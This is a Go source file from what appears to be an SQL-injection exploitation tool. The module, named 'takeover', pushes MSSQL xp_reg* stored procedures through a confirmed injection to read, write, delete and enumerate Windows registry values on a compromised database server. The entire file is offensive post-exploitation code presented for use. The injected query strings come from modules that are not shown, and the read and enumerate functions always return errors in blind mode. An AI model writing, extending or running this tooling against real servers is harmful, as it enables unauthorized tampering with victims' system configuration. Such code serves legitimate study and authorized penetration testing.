package takeover

import (
	"context"
	"errors"
	"strings"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/enumeration"
)

// Registry provides Windows registry access through MSSQL's xp_reg* extended
// stored procedures. It is only meaningful on MSSQL backends; constructing it
// for another DBMS yields operations that report unsupported.
type Registry struct {
	det    sqli.Detection
	client *httpclient.Client
	ext    *enumeration.Extractor
	q      *dbms.Queries
}

// NewRegistry builds a registry channel from a confirmed detection.
func NewRegistry(det sqli.Detection, client *httpclient.Client) *Registry {
	return &Registry{
		det:    det,
		client: client,
		ext:    enumeration.NewExtractor(det, client, enumeration.Options{Concurrency: enumeration.DefaultConcurrency}),
		q:      dbms.Post(det.DBMS),
	}
}

// Supported reports whether registry operations are possible (MSSQL + xp_reg*).
func (r *Registry) Supported() bool {
	return r.q != nil && r.q.RegRead != nil
}

// Read reads a registry value. Hive is like "HKLM", path like
// "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", key is the value name.
func (r *Registry) Read(ctx context.Context, hive, path, key string) (string, error) {
	if !r.Supported() {
		return "", errors.New("registry access requires MSSQL with xp_regread")
	}
	q := r.q.RegRead(hive, path, key)
	if v := r.ext.StackIf(q); v != "" {
		_, err := r.ext.Send(ctx, v)
		if err != nil {
			return "", err
		}
	}
	return "", errors.New("registry value could not be captured (blind mode cannot read xp_regread output directly)")
}

// Write sets a registry value (REG_SZ).
func (r *Registry) Write(ctx context.Context, hive, path, key, value string) error {
	if !r.Supported() {
		return errors.New("registry access requires MSSQL with xp_regwrite")
	}
	q := r.q.RegWrite(hive, path, key, value)
	if v := r.ext.StackIf(q); v != "" {
		_, err := r.ext.Send(ctx, v)
		return err
	}
	return errors.New("backend does not support stacked statements required for registry write")
}

// Delete removes a registry value.
func (r *Registry) Delete(ctx context.Context, hive, path, key string) error {
	if !r.Supported() {
		return errors.New("registry access requires MSSQL with xp_regdeletevalue")
	}
	q := r.q.RegDelete(hive, path, key)
	if v := r.ext.StackIf(q); v != "" {
		_, err := r.ext.Send(ctx, v)
		return err
	}
	return errors.New("backend does not support stacked statements required for registry delete")
}

// EnumSubkeys lists the subkeys of a registry path.
func (r *Registry) EnumSubkeys(ctx context.Context, hive, path string) ([]string, error) {
	if !r.Supported() {
		return nil, errors.New("registry access requires MSSQL with xp_regenumkeys")
	}
	q := r.q.RegEnumKeys(hive, path)
	if v := r.ext.StackIf(q); v != "" {
		_, err := r.ext.Send(ctx, v)
		if err != nil {
			return nil, err
		}
	}
	return nil, errors.New("subkey enumeration output cannot be captured in blind mode")
}

// NormalizeHive maps common short names to their full registry hive strings.
func NormalizeHive(hive string) string {
	switch strings.ToUpper(strings.TrimSpace(hive)) {
	case "HKLM", "HKEY_LOCAL_MACHINE":
		return "HKEY_LOCAL_MACHINE"
	case "HKCU", "HKEY_CURRENT_USER":
		return "HKEY_CURRENT_USER"
	case "HKCR", "HKEY_CLASSES_ROOT":
		return "HKEY_CLASSES_ROOT"
	case "HKU", "HKEY_USERS":
		return "HKEY_USERS"
	case "HKCC", "HKEY_CURRENT_CONFIG":
		return "HKEY_CURRENT_CONFIG"
	default:
		return hive
	}
}
